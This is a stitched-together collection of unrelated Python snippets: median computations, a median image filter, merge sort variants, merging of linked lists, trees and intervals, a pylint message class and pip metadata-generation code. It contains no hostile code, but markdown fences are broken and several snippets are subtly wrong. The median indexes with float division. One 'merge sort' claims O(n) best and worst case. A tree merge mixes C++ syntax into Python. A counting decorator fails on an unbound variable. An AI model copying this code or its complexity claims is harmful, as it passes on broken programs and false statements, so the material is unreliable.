# Median is the middle value of data
# Data of odd length has a mid value
# but, data of even length has 2 mid values
# so their median is mean of these 2 values

# ranked parameter is to tell function
# weather data is ranked(sorted) or not
#
def median(ar, ranked=False):
    if not ranked:
        data = sorted(ar[:])
    else:
        # Don't need an else block still
        # but to map program properly
        # i've added it
        data = ar[:]

    # Data with odd length
    if len(data) % 2 != 0:

        # f(x) = (l(x) + 1) / 2 th term is the median of data
        # but since computer starts counting from 0
        # and not from 1, there is no need to add 1
        # to length of data, otherwise results are
        # not accurate
        return data[len(data) / 2]

    # Data with even length
    # f(x) = [l(x) / 2 th term + (l(x) + 2) / 2th term] / 2
    # 2.0 is to declare that median can be a float
    # in case of even length data
    return (data[len(data) / 2 - 1] + data[(len(data) + 1) / 2]) / 2.0


# Test
odd = [123, 456, 789, 101112, 131415, 161718, 192021, 222324, 252627]
even = [8, 7, 5, 2, 1, 3, 4, 6]

if median(odd, ranked=True) == 131415 and median(even) == 4.5:

    # Print statements on separate lines look better
    print("Median of odd data: " + str(131415))
    print("Median of even data: " + str(4.5))
    print("Yeah, it works!")

else:
    # If algo didn't work
    print("There's something wrong!")

# This median is for un-distributed/un-grouped data
# i.e. no frequencies
# plain numbers in an array
````

````py
Implementation of median filter algorithm```


```py
from cv2 import COLOR_BGR2GRAY, cvtColor, imread, imshow, waitKey
from numpy import divide, int8, multiply, ravel, sort, zeros_like


def median_filter(gray_img, mask=3):
    """
    :param gray_img: gray image
    :param mask: mask size
    :return: image with median filter
    """
    # set image borders
    bd = int(mask / 2)
    # copy image size
    median_img = zeros_like(gray_img)
    for i in range(bd, gray_img.shape[0] - bd):
        for j in range(bd, gray_img.shape[1] - bd):
            # get mask according with mask
            kernel = ravel(gray_img[i - bd : i + bd + 1, j - bd : j + bd + 1])
            # calculate mask median
            median = sort(kernel)[int8(divide((multiply(mask, mask)), 2) + 1)]
            median_img[i, j] = median
    return median_img


if __name__ == "__main__":
    # read original image
    img = imread("../image_data/lena.jpg")
    # turn image in gray scale value
    gray = cvtColor(img, COLOR_BGR2GRAY)

    # get values with two different mask size
    median3x3 = median_filter(gray, 3)
    median5x5 = median_filter(gray, 5)

    # show result images
    imshow("median filter with 3x3 mask", median3x3)
    imshow("median filter with 5x5 mask", median5x5)
    waitKey(0)

from typing import List


def median_of_two_arrays(nums1: List[float], nums2: List[float]) -> float:
    """
    >>> median_of_two_arrays([1, 2], [3])
    2
    >>> median_of_two_arrays([0, -1.1], [2.5, 1])
    0.5
    >>> median_of_two_arrays([], [2.5, 1])
    1.75
    >>> median_of_two_arrays([], [0])
    0
    >>> median_of_two_arrays([], [])
    Traceback (most recent call last):
      ...
    IndexError: list index out of range
    """
    all_numbers = sorted(nums1 + nums2)
    div, mod = divmod(len(all_numbers), 2)
    if mod == 1:
        return all_numbers[div]
    else:
        return (all_numbers[div] + all_numbers[div - 1]) / 2


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    array_1 = [float(x) for x in input("Enter the elements of first array: ").split()]
    array_2 = [float(x) for x in input("Enter the elements of second array: ").split()]
    print(f"The median of two arrays is: {median_of_two_arrays(array_1, array_2)}")
````

````py
Solution to Project Euler Problem
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Memoization.```


```py
from functools import lru_cache


def memoize(fun):
    return lru_cache(None)(fun)

def memoize(func):
    cache = {}

    def wrapped(*args, **kwargs):
        key = (tuple(args), tuple(kwargs.items()))
        if key not in cache:
            cache[key] = func(*args, **kwargs)
        return cache[key]

    return wrapped

def merge_sort(A):
  merge_sort_aux(A, 0, len(A))

def merge_sort_aux(A, low, high):
  if low < high:
    mid = (low+high)//2
    merge_sort_aux(A, low, mid)
    merge_sort_aux(A, mid+1, high)
    merge(A, low, mid, high)

def merge(A, low, mid, high):
  # Merge ascendantly
  L = A[low:mid+1]
  R = A[mid+1:high+1]
  i = j = 0
  k = low

  while (i < len(L) and j < len(R)):
    if (L[i] <= R[j]):
      A[k] = L[i]
      i += 1
      k += 1
    else:
      A[k] = R[j]
      j += 1
      k += 1

  while (i < len(L)):
    A[k] = L[i]
    i += 1
    k += 1

  while (j < len(R)):
    A[k] = R[j]
    j += 1
    k += 1
# Singly-linked lists are already defined with this interface:
# class ListNode(object):
#   def __init__(self, x):
#     self.value = x
#     self.next = None
#
def mergeTwoLinkedLists(l1, l2):

    if l1 == None and l2 == None:
        return None

    merged = ListNode(None)
    ret = merged
    # prev = merged.value
    while l1 != None or l2 != None:
        if l1 != None:
            if l2 == None and l1.next == None:
                merged.value = l1.value
                break
        if l2 != None:
            if l1 == None and l2.next == None:
                merged.value = l2.value
                break

        m1 = l2.value if l1 == None else l1.value
        m2 = l1.value if l2 == None else l2.value
        val = min(m2 if m1 == None else m1, m1 if m2 == None else m2)

        merged.next = ListNode(None)
        merged.value = val
        merged = merged.next

        if l1 != None and val >= l1.value:
            l1 = l1.next
        elif l2 != None and val >= l2.value:
            l2 = l2.next

    return ret

# Merge two sorted linked lists and return it as a sorted list. The list should be made by splicing together the nodes of the first two lists.


# Example 1:


# Input: l1 = [1,2,4], l2 = [1,3,4]
# Output: [1,1,2,3,4,4]
# Example 2:

# Input: l1 = [], l2 = []
# Output: []
# Example 3:

# Input: l1 = [], l2 = [0]
# Output: [0]


# Constraints:

# The number of nodes in both lists is in the range [0, 50].
# -100 <= Node.val <= 100
# Both l1 and l2 are sorted in non-decreasing order.

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def mergeTwoLists(self, l1: ListNode, l2: ListNode) -> ListNode:
        new_list = ListNode()
        if l1 is None:
            return l2
        if l2 is None:
            return l1

        if l1.val <= l2.val:
            new_list = l1
            l1 = l1.next
        else:
            new_list = l2
            l2 = l2.next

        new_list.next = self.mergeTwoLists(l1, l2)

        return new_list

# You are given two binary trees root1 and root2.

# Imagine that when you put one of them to cover the other, some nodes of the two trees are overlapped while the others are not. You need to merge the two trees into a new binary tree. The merge rule is that if two nodes overlap, then sum node values up as the new value of the merged node. Otherwise, the NOT null node will be used as the node of the new tree.

# Return the merged tree.

# Note: The merging process must start from the root nodes of both trees.



# Example 1:


# Input: root1 = [1,3,2,5], root2 = [2,1,3,null,4,null,7]
# Output: [3,4,5,5,4,null,7]
# Example 2:

# Input: root1 = [1], root2 = [1,2]
# Output: [2,2]


# Constraints:

# The number of nodes in both trees is in the range [0, 2000].
# -104 <= Node.val <= 104


/**
 * Definition for a binary tree node.
 * struct TreeNode {
 *     int val;
 *     TreeNode *left;
 *     TreeNode *right;
 *     TreeNode() : val(0), left(nullptr), right(nullptr) {}
 *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}
 *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}
 * };
 */
class Solution {
   def mergeTrees(self,root1: TreeNode, root2: TreeNode) -> TreeNode:
        #check if either tree is empty
        if not root1:
            return root2

        if not root2:
            return root1

        mergeNode = TreeNode(root1.val + root2.val)
        mergeNode.left = self.mergeTrees(root1.left,  root2.left)
        mergeNode.right = self.mergeTrees(root1.right, root2.right)


        return mergeNode
    }
};

from linked_list import LinkedList


def merge_alternate_nodes(alist, blist):
    pass


# Tests
alist = LinkedList()
blist = LinkedList()

alist.add_to_tail("a")
alist.add_to_tail("b")
alist.add_to_tail("c")

blist.add_to_tail(1)
blist.add_to_tail(2)
blist.add_to_tail(3)

print(merge_alternate_nodes(alist, blist))
# should print

alist = LinkedList()
blist = LinkedList()

alist.add_to_tail("x")

blist.add_to_tail(10)
blist.add_to_tail(20)
blist.add_to_tail(30)

print(merge_alternate_nodes(alist, blist))
# should print

alist = LinkedList()
blist = LinkedList()

alist.add_to_tail("i")
alist.add_to_tail("j")
alist.add_to_tail("k")

print(merge_alternate_nodes(alist, blist))
# should print

# Given a collection of intervals, merge all overlapping intervals.
#
# Example 1:
#
# Input: [[1,3],[2,6],[8,10],[15,18]]
# Output: [[1,6],[8,10],[15,18]]
# Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6].
# Example 2:
#
# Input: [[1,4],[4,5]]
# Output: [[1,5]]
# Explanation: Intervals [1,4] and [4,5] are considered overlapping.


class Solution:
    def merge(self, intervals):
        intervals.sort(key=lambda x: x[0])
        res = []

        for interval in intervals:

            if not res or res[-1][1] < interval[0]:
                res.append(interval)

            else:
                res[-1][1] = max(res[-1][1], interval[1])

        return res
````

````py
Merge K Sorted Linked Lists

Merge k sorted linked lists and return it as one sorted list. Analyze and describe its complexity.

=========================================
Using Priority Queue (heap) in each step chose the smallest element from the lists and add it to the result list.
    Time Complexity:  O(N * LogK)  , LogK is for adding and deleting from Priority queue
    Space Complexity:  O(N)
Using Divide and Conquer, similar to Merge sort.
    Time Complexity:    O(N * LogK)
    Space Complexity:   O(1)  , (using the same old list)```


```py


##############
# Solution 1 #
##############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode

import heapq

# priority queue comparator class
class PQNode:
    def __init__(self, node):
        self.val = node.val
        self.node = node

    def __lt__(self, other):
        return self.val < other.val


# priority queue
class PriorityQueue:
    def __init__(self):
        self.data = []

    def push(self, node):
        heapq.heappush(self.data, PQNode(node))

    def pop(self):
        return heapq.heappop(self.data).node

    def is_empty(self):
        return len(self.data) == 0


def merge_k_lists_1(lists):
    heap = PriorityQueue()

    # add all linked lists in the heap
    for node in lists:
        if node is not None:
            heap.push(node)

    result = ListNode(-1)
    pointer = result

    while not heap.is_empty():
        # in each step remove the min list from the heap
        node = heap.pop()

        # add the min list to the result
        pointer.next = node
        pointer = pointer.next

        node = node.next
        if node is not None:
            # take the next node from the min list and add it in the heap
            heap.push(node)

    return result.next


##############
# Solution 2 #
##############


def merge_k_lists_2(lists):
    n = len(lists)
    if n == 0:
        return None

    # the step tells with which linked list should be merged the current linked list
    step = 1

    # divide and conquer without recursion
    while step < n:
        i = 0

        while i + step < n:
            lists[i] = merge_2_lists(lists[i], lists[i + step])
            # go to the next pair
            i += 2 * step

        # double the step
        step *= 2

    return lists[0]


def merge_2_lists(l1, l2):
    result = ListNode(-1)
    pointer = result

    while (l1 is not None) and (l2 is not None):
        if l1.val < l2.val:
            pointer.next = l1
            l1 = l1.next
        else:
            pointer.next = l2
            l2 = l2.next

        pointer = pointer.next

    if l1 is not None:
        pointer.next = l1

    if l2 is not None:
        pointer.next = l2

    return result.next

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, val=0, next=None):
#         self.val = val
#         self.next = next
class Solution:
    def mergeTwoLists(self, l1: ListNode, l2: ListNode) -> ListNode:
        pass
def merge_sort(arr):
    """ Merge Sort
        Complexity: O(n log(n))
    """
    # Our recursive base case
    if len(arr) <= 1:
        return arr
    mid = len(arr) // 2
    # Perform merge_sort recursively on both halves
    left, right = merge_sort(arr[:mid]), merge_sort(arr[mid:])

    # Merge each side together
    return merge(left, right, arr.copy())


def merge(left, right, merged):
    """ Merge helper
        Complexity: O(n)
    """

    left_cursor, right_cursor = 0, 0
    while left_cursor < len(left) and right_cursor < len(right):
        # Sort each one and place into the result
        if left[left_cursor] <= right[right_cursor]:
            merged[left_cursor + right_cursor] = left[left_cursor]
            left_cursor += 1
        else:
            merged[left_cursor + right_cursor] = right[right_cursor]
            right_cursor += 1
    # Add the left overs if there's any left to the result
    for left_cursor in range(left_cursor, len(left)):
        merged[left_cursor + right_cursor] = left[left_cursor]
    # Add the left overs if there's any left to the result
    for right_cursor in range(right_cursor, len(right)):
        merged[left_cursor + right_cursor] = right[right_cursor]

    # Return result
    return merged

'''
Python implementation of merge sort algorithm.
Takes an average of 0.6 microseconds to sort a list of length 1000 items.
Best Case Scenario : O(n)
Worst Case Scenario : O(n)
'''
def merge_sort(LIST):
    start = []
    end = []
    while len(LIST) > 1:
        a = min(LIST)
        b = max(LIST)
        start.append(a)
        end.append(b)
        LIST.remove(a)
        LIST.remove(b)
    if LIST: start.append(LIST[0])
    end.reverse()
    return (start + end)
````

````py
Merge k sorted linked lists and return it as one sorted list. Analyze and describe its complexity.```


```py


from heapq import heappop, heapreplace, heapify
from queue import PriorityQueue


# Definition for singly-linked list.
class ListNode(object):
    def __init__(self, x):
        self.val = x
        self.next = None


def merge_k_lists(lists):
    dummy = node = ListNode(0)
    h = [(n.val, n) for n in lists if n]
    heapify(h)
    while h:
        v, n = h[0]
        if n.next is None:
            heappop(h)  # only change heap size when necessary
        else:
            heapreplace(h, (n.next.val, n.next))
        node.next = n
        node = node.next

    return dummy.next


def merge_k_lists(lists):
    dummy = ListNode(None)
    curr = dummy
    q = PriorityQueue()
    for node in lists:
        if node:
            q.put((node.val, node))
    while not q.empty():
        curr.next = q.get()[1]  # These two lines seem to
        curr = curr.next  # be equivalent to :-   curr = q.get()[1]
        if curr.next:
            q.put((curr.next.val, curr.next))
    return dummy.next

````

````py
I think my code's complexity is also O(nlogk) and not using heap or priority queue,
n means the total elements and k means the size of list.

The mergeTwoLists function in my code comes from the problem Merge Two Sorted Lists
whose complexity obviously is O(n), n is the sum of length of l1 and l2.

To put it simpler, assume the k is 2^x, So the progress of combination is like a full binary tree,
from bottom to top. So on every level of tree, the combination complexity is n,
because every level have all n numbers without repetition.
The level of tree is x, ie log k. So the complexity is O(n log k).

for example, 8 ListNode, and the length of every ListNode is x1, x2,
x3, x4, x5, x6, x7, x8, total is n.

on level 3: x1+x2, x3+x4, x5+x6, x7+x8 sum: n

on level 2: x1+x2+x3+x4, x5+x6+x7+x8 sum: n

on level 1: x1+x2+x3+x4+x5+x6+x7+x8 sum: n```


```py
````

````py
Merge Sorted Linked Lists

Input: 1 -> 2 -> 4, 1 -> 3 -> 4
Output: 1 -> 1 -> 2 -> 3 -> 4 -> 4

=========================================
Simple solution with pointers manipulation (just change the pointers of the old nodes, if there is smaller node than the old one).
    Time Complexity:    O(N + M)
    Space Complexity:   O(1)        - working with the same old nodes (no extra space)```


```py


############
# Solution #
############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def merge_two_sorted_ll(l1, l2):
    result = ListNode(-1)
    pointer = result

    while (l1 is not None) and (l2 is not None):
        if l1.val < l2.val:
            pointer.next = l1
            l1 = l1.next
        else:
            pointer.next = l2
            l2 = l2.next

        pointer = pointer.next

    if l1 is not None:
        pointer.next = l1

    if l2 is not None:
        pointer.next = l2

    return result.next


###########
# Testing #
###########

from .testing_ll import build_ll, print_ll

# Test 1
# Correct result => 1 -> 2 -> 3 -> 4 -> 5 -> 6 -> 7 -> 8 -> 9
a = build_ll([1, 2, 3, 4, 5])
b = build_ll([6, 7, 8, 9])
print_ll(merge_two_sorted_ll(a, b))

# Test 2
# Correct result => 1 -> 2 -> 3 -> 4 -> 5 -> 6 -> 7
a = build_ll([1, 3, 5])
b = build_ll([2, 4, 6, 7])
print_ll(merge_two_sorted_ll(a, b))

# Test 3
# Correct result => 1 -> 1 -> 2 -> 3 -> 4 -> 4
a = build_ll([1, 2, 4])
b = build_ll([1, 3, 4])
print_ll(merge_two_sorted_ll(a, b))
````

````py
At a job interview, you are challenged to write an algorithm to check if a
given string, s, can be formed from two other strings, part1 and part2.
The restriction is that the characters in part1 and part2 are in the same
order as in s. The interviewer gives you the following example and tells
you to figure out the rest from the given test cases.
'codewars' is a merge from 'cdw' and 'oears':
s:  c o d e w a r s   = codewars
part1:  c   d   w         = cdw
part2:    o   e   a r s   = oears```


```py


# Recursive Solution
def is_merge_recursive(s, part1, part2):
    if not part1:
        return s == part2
    if not part2:
        return s == part1
    if not s:
        return part1 + part2 == ""
    if s[0] == part1[0] and is_merge_recursive(s[1:], part1[1:], part2):
        return True
    if s[0] == part2[0] and is_merge_recursive(s[1:], part1, part2[1:]):
        return True
    return False


# An iterative approach
def is_merge_iterative(s, part1, part2):
    tuple_list = [(s, part1, part2)]
    while tuple_list:
        string, p1, p2 = tuple_list.pop()
        if string:
            if p1 and string[0] == p1[0]:
                tuple_list.append((string[1:], p1[1:], p2))
            if p2 and string[0] == p2[0]:
                tuple_list.append((string[1:], p1, p2[1:]))
        else:
            if not p1 and not p2:
                return True
    return False

#!/usr/local/bin/python3```


```py
Problem Description: Given two binary tree, return the merged tree.
The rule for merging is that if two nodes overlap, then put the value sum of
both nodes to the new value of the merged node. Otherwise, the NOT null node
will be used as the node of new tree.```


```py
from typing import Optional


class Node:
    """
    A binary node has value variable and pointers to its left and right node.
    """

    def __init__(self, value: int = 0) -> None:
        self.value = value
        self.left: Optional[Node] = None
        self.right: Optional[Node] = None


def merge_two_binary_trees(tree1: Optional[Node], tree2: Optional[Node]) -> Node:
    """
    Returns root node of the merged tree.

    >>> tree1 = Node(5)
    >>> tree1.left = Node(6)
    >>> tree1.right = Node(7)
    >>> tree1.left.left = Node(2)
    >>> tree2 = Node(4)
    >>> tree2.left = Node(5)
    >>> tree2.right = Node(8)
    >>> tree2.left.right = Node(1)
    >>> tree2.right.right = Node(4)
    >>> merged_tree = merge_two_binary_trees(tree1, tree2)
    >>> print_preorder(merged_tree)
    9
    11
    2
    1
    15
    4
    """
    if tree1 is None:
        return tree2
    if tree2 is None:
        return tree1

    tree1.value = tree1.value + tree2.value
    tree1.left = merge_two_binary_trees(tree1.left, tree2.left)
    tree1.right = merge_two_binary_trees(tree1.right, tree2.right)
    return tree1


def print_preorder(root: Optional[Node]) -> None:
    """
    Print pre-order traversal of the tree.

    >>> root = Node(1)
    >>> root.left = Node(2)
    >>> root.right = Node(3)
    >>> print_preorder(root)
    1
    2
    3
    >>> print_preorder(root.right)
    3
    """
    if root:
        print(root.value)
        print_preorder(root.left)
        print_preorder(root.right)


if __name__ == "__main__":
    tree1 = Node(1)
    tree1.left = Node(2)
    tree1.right = Node(3)
    tree1.left.left = Node(4)

    tree2 = Node(2)
    tree2.left = Node(4)
    tree2.right = Node(6)
    tree2.left.right = Node(9)
    tree2.right.right = Node(5)

    print("Tree1 is: ")
    print_preorder(tree1)
    print("Tree2 is: ")
    print_preorder(tree2)
    merged_tree = merge_two_binary_trees(tree1, tree2)
    print("Merged Tree is: ")
    print_preorder(merged_tree)
````

````py
Algorithm that merges two sorted linked lists into one sorted linked list.```


```py
from __future__ import annotations

from collections.abc import Iterable, Iterator
from dataclasses import dataclass
from typing import Optional

test_data_odd = (3, 9, -11, 0, 7, 5, 1, -1)
test_data_even = (4, 6, 2, 0, 8, 10, 3, -2)


@dataclass
class Node:
    data: int
    next: Optional[Node]


class SortedLinkedList:
    def __init__(self, ints: Iterable[int]) -> None:
        self.head: Optional[Node] = None
        for i in reversed(sorted(ints)):
            self.head = Node(i, self.head)

    def __iter__(self) -> Iterator[int]:
        """
        >>> tuple(SortedLinkedList(test_data_odd)) == tuple(sorted(test_data_odd))
        True
        >>> tuple(SortedLinkedList(test_data_even)) == tuple(sorted(test_data_even))
        True
        """
        node = self.head
        while node:
            yield node.data
            node = node.next

    def __len__(self) -> int:
        """
        >>> for i in range(3):
        ...     len(SortedLinkedList(range(i))) == i
        True
        True
        True
        >>> len(SortedLinkedList(test_data_odd))
        8
        """
        return len(tuple(iter(self)))

    def __str__(self) -> str:
        """
        >>> str(SortedLinkedList([]))
        ''
        >>> str(SortedLinkedList(test_data_odd))
        '-11 -> -1 -> 0 -> 1 -> 3 -> 5 -> 7 -> 9'
        >>> str(SortedLinkedList(test_data_even))
        '-2 -> 0 -> 2 -> 3 -> 4 -> 6 -> 8 -> 10'
        """
        return " -> ".join([str(node) for node in self])


def merge_lists(
    sll_one: SortedLinkedList, sll_two: SortedLinkedList
) -> SortedLinkedList:
    """
    >>> SSL = SortedLinkedList
    >>> merged = merge_lists(SSL(test_data_odd), SSL(test_data_even))
    >>> len(merged)
    16
    >>> str(merged)
    '-11 -> -2 -> -1 -> 0 -> 0 -> 1 -> 2 -> 3 -> 3 -> 4 -> 5 -> 6 -> 7 -> 8 -> 9 -> 10'
    >>> list(merged) == list(sorted(test_data_odd + test_data_even))
    True
    """
    return SortedLinkedList(list(sll_one) + list(sll_two))


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    SSL = SortedLinkedList
    print(merge_lists(SSL(test_data_odd), SSL(test_data_even)))

from typing import List


def merge(left_half: List, right_half: List) -> List:
    """Helper function for mergesort.

    >>> left_half = [-2]
    >>> right_half = [-1]
    >>> merge(left_half, right_half)
    [-2, -1]

    >>> left_half = [1,2,3]
    >>> right_half = [4,5,6]
    >>> merge(left_half, right_half)
    [1, 2, 3, 4, 5, 6]

    >>> left_half = [-2]
    >>> right_half = [-1]
    >>> merge(left_half, right_half)
    [-2, -1]

    >>> left_half = [12, 15]
    >>> right_half = [13, 14]
    >>> merge(left_half, right_half)
    [12, 13, 14, 15]

    >>> left_half = []
    >>> right_half = []
    >>> merge(left_half, right_half)
    []
    """
    sorted_array = [None] * (len(right_half) + len(left_half))

    pointer1 = 0  # pointer to current index for left Half
    pointer2 = 0  # pointer to current index for the right Half
    index = 0  # pointer to current index for the sorted array Half

    while pointer1 < len(left_half) and pointer2 < len(right_half):
        if left_half[pointer1] < right_half[pointer2]:
            sorted_array[index] = left_half[pointer1]
            pointer1 += 1
            index += 1
        else:
            sorted_array[index] = right_half[pointer2]
            pointer2 += 1
            index += 1
    while pointer1 < len(left_half):
        sorted_array[index] = left_half[pointer1]
        pointer1 += 1
        index += 1

    while pointer2 < len(right_half):
        sorted_array[index] = right_half[pointer2]
        pointer2 += 1
        index += 1

    return sorted_array


def merge_sort(array: List) -> List:
    """Returns a list of sorted array elements using merge sort.

    >>> from random import shuffle
    >>> array = [-2, 3, -10, 11, 99, 100000, 100, -200]
    >>> shuffle(array)
    >>> merge_sort(array)
    [-200, -10, -2, 3, 11, 99, 100, 100000]

    >>> shuffle(array)
    >>> merge_sort(array)
    [-200, -10, -2, 3, 11, 99, 100, 100000]

    >>> array = [-200]
    >>> merge_sort(array)
    [-200]

    >>> array = [-2, 3, -10, 11, 99, 100000, 100, -200]
    >>> shuffle(array)
    >>> sorted(array) == merge_sort(array)
    True

    >>> array = [-2]
    >>> merge_sort(array)
    [-2]

    >>> array = []
    >>> merge_sort(array)
    []

    >>> array = [10000000, 1, -1111111111, 101111111112, 9000002]
    >>> sorted(array) == merge_sort(array)
    True
    """
    if len(array) <= 1:
        return array
    # the actual formula to calculate the middle element = left + (right - left) // 2
    # this avoids integer overflow in case of large N
    middle = 0 + (len(array) - 0) // 2

    # Split the array into halves till the array length becomes equal to One
    # merge the arrays of single length returned by mergeSort function and
    # pass them into the merge arrays function which merges the array
    left_half = array[:middle]
    right_half = array[middle:]

    return merge(merge_sort(left_half), merge_sort(right_half))


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# overall function that recursively splits an input array in half, and
# uses the helper function "merge" to compare items in each half against each
# other to sort them
def mergeSort(list):
    # Determine whether the list is broken into
    # individual pieces.
    if len(list) < 2:
        return list

    # Find the middle of the list.
    middle = len(list) // 2

    # Break the list into two pieces.
    left = mergeSort(list[:middle])
    right = mergeSort(list[middle:])

    # Merge the two sorted pieces into a larger piece.
    print("Left side: ", left)
    print("Right side: ", right)
    merged = merge(left, right)
    print("Merged ", merged)
    return merged


# helper function that checks split pieces of "parent" array against one another
def merge(left, right):
    # When the left side or the right side is empty,
    # it means that this is an individual item and is
    # already sorted.
    if not len(left):
        return left
    if not len(right):
        return right

    # Define variables used to merge the two pieces.
    result = []
    leftIndex = 0
    rightIndex = 0
    totalLen = len(left) + len(right)

    # Keep working until all of the items are merged.
    while len(result) < totalLen:

        # Perform the required comparisons and merge
        # the pieces according to value.
        if left[leftIndex] < right[rightIndex]:
            result.append(left[leftIndex])
            leftIndex += 1
        else:
            result.append(right[rightIndex])
            rightIndex += 1

        # When the left side or the right side is longer,
        # add the remaining elements to the result.
        if leftIndex == len(left) or rightIndex == len(right):
            result.extend(left[leftIndex:] or right[rightIndex:])
            break

    return result

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE


import collections

from pylint.constants import MSG_TYPES

_MsgBase = collections.namedtuple(
    "_MsgBase",
    [
        "msg_id",
        "symbol",
        "msg",
        "C",
        "category",
        "confidence",
        "abspath",
        "path",
        "module",
        "obj",
        "line",
        "column",
    ],
)


class Message(_MsgBase):
    """This class represent a message to be issued by the reporters"""

    def __new__(cls, msg_id, symbol, location, msg, confidence):
        return _MsgBase.__new__(
            cls,
            msg_id,
            symbol,
            msg,
            msg_id[0],
            MSG_TYPES[msg_id[0]],
            confidence,
            *location
        )

    def format(self, template: str) -> str:
        """Format the message according to the given template.

        The template format is the one of the format method :
        cf. https://docs.python.org/2/library/string.html#formatstrings
        """
        return template.format(**self._asdict())

def calculateSubstringsLengthK(s, k):
    """
    Return substrings of size k in s
    """
    substrings, index = [], 0
    while index + k <= len(s):
        substrings.append(s[index : index + k])
        index += k
    return substrings


def messageFromBinaryCode(code):
    """
    Return encrypted message from binary code
    """
    substrings, encrypted_message = calculateSubstringsLengthK(code, 8), ""
    for substring in substrings:
        ascii_code = int(substring, 2)
        encrypted_message += chr(ascii_code)
    return encrypted_message
````

`pyBuild metadata for a project using PEP 517 hooks.`

```py
import argparse
import logging
import os
import shutil
import functools

try:
    import importlib.metadata as imp_meta
except ImportError:
    import importlib_metadata as imp_meta

try:
    from zipfile import Path
except ImportError:
    from zipp import Path

from .envbuild import BuildEnvironment
from .wrappers import Pep517HookCaller, quiet_subprocess_runner
from .dirtools import tempdir, mkdir_p, dir_to_zipfile
from .build import validate_system, load_system, compat_system

log = logging.getLogger(__name__)


def _prep_meta(hooks, env, dest):
    reqs = hooks.get_requires_for_build_wheel({})
    log.info("Got build requires: %s", reqs)

    env.pip_install(reqs)
    log.info("Installed dynamic build dependencies")

    with tempdir() as td:
        log.info("Trying to build metadata in %s", td)
        filename = hooks.prepare_metadata_for_build_wheel(td, {})
        source = os.path.join(td, filename)
        shutil.move(source, os.path.join(dest, os.path.basename(filename)))


def build(source_dir=".", dest=None, system=None):
    system = system or load_system(source_dir)
    dest = os.path.join(source_dir, dest or "dist")
    mkdir_p(dest)
    validate_system(system)
    hooks = Pep517HookCaller(
        source_dir, system["build-backend"], system.get("backend-path")
    )

    with hooks.subprocess_runner(quiet_subprocess_runner):
        with BuildEnvironment() as env:
            env.pip_install(system["requires"])
            _prep_meta(hooks, env, dest)


def build_as_zip(builder=build):
    with tempdir() as out_dir:
        builder(dest=out_dir)
        return dir_to_zipfile(out_dir)


def load(root):
    """
    Given a source directory (root) of a package,
    return an importlib.metadata.Distribution object
    with metadata build from that package.
    """
    root = os.path.expanduser(root)
    system = compat_system(root)
    builder = functools.partial(build, source_dir=root, system=system)
    path = Path(build_as_zip(builder))
    return imp_meta.PathDistribution(path)


parser = argparse.ArgumentParser()
parser.add_argument("source_dir", help="A directory containing pyproject.toml")
parser.add_argument(
    "--out-dir",
    "-o",
    help="Destination in which to save the builds relative to source dir",
)


def main():
    args = parser.parse_args()
    build(args.source_dir, args.out_dir)


if __name__ == "__main__":
    main()
```

`pyMetadata generation logic for source distributions.`

```py

import os

from pip._vendor.pep517.wrappers import Pep517HookCaller

from pip._internal.build_env import BuildEnvironment
from pip._internal.utils.subprocess import runner_with_spinner_message
from pip._internal.utils.temp_dir import TempDirectory


def generate_metadata(build_env, backend):
    # type: (BuildEnvironment, Pep517HookCaller) -> str
    """Generate metadata using mechanisms described in PEP 517.

    Returns the generated metadata directory.
    """
    metadata_tmpdir = TempDirectory(
        kind="modern-metadata", globally_managed=True
    )

    metadata_dir = metadata_tmpdir.path

    with build_env:
        # Note that Pep517HookCaller implements a fallback for
        # prepare_metadata_for_build_wheel, so we don't have to
        # consider the possibility that this hook doesn't exist.
        runner = runner_with_spinner_message("Preparing wheel metadata")
        with backend.subprocess_runner(runner):
            distinfo_dir = backend.prepare_metadata_for_build_wheel(
                metadata_dir
            )

    return os.path.join(metadata_dir, distinfo_dir)
```

`pyMetadata generation logic for legacy source distributions.`

```py

import logging
import os

from pip._internal.build_env import BuildEnvironment
from pip._internal.exceptions import InstallationError
from pip._internal.utils.setuptools_build import make_setuptools_egg_info_args
from pip._internal.utils.subprocess import call_subprocess
from pip._internal.utils.temp_dir import TempDirectory

logger = logging.getLogger(__name__)


def _find_egg_info(directory):
    # type: (str) -> str
    """Find an .egg-info subdirectory in `directory`.
    """
    filenames = [
        f for f in os.listdir(directory) if f.endswith(".egg-info")
    ]

    if not filenames:
        raise InstallationError(
            f"No .egg-info directory found in {directory}"
        )

    if len(filenames) > 1:
        raise InstallationError(
            "More than one .egg-info directory found in {}".format(
                directory
            )
        )

    return os.path.join(directory, filenames[0])


def generate_metadata(
    build_env,  # type: BuildEnvironment
    setup_py_path,  # type: str
    source_dir,  # type: str
    isolated,  # type: bool
    details,  # type: str
):
    # type: (...) -> str
    """Generate metadata using setup.py-based defacto mechanisms.

    Returns the generated metadata directory.
    """
    logger.debug(
        'Running setup.py (path:%s) egg_info for package %s',
        setup_py_path, details,
    )

    egg_info_dir = TempDirectory(
        kind="pip-egg-info", globally_managed=True
    ).path

    args = make_setuptools_egg_info_args(
        setup_py_path,
        egg_info_dir=egg_info_dir,
        no_user_config=isolated,
    )

    with build_env:
        call_subprocess(
            args,
            cwd=source_dir,
            command_desc='python setup.py egg_info',
        )

    # Return the .egg-info directory.
    return _find_egg_info(egg_info_dir)

from functools import wraps


def metrics(fn):
    ncalls = 0
    name = fn.__name__

    @wraps(fn)
    def wrapper(*args, **kw):
        ncalls += 1
        print(f"{name} called {ncalls} times")

    return wrapper


@metrics
def inc(n):
    return n + 1


inc(3)

from functools import wraps


def metrics(fn):
    ncalls = [0]
    name = fn.__name__

    @wraps(fn)
    def wrapper(*args, **kw):
        ncalls[0] += 1
        print(f"{name} called {ncalls[0]} times")

    return wrapper


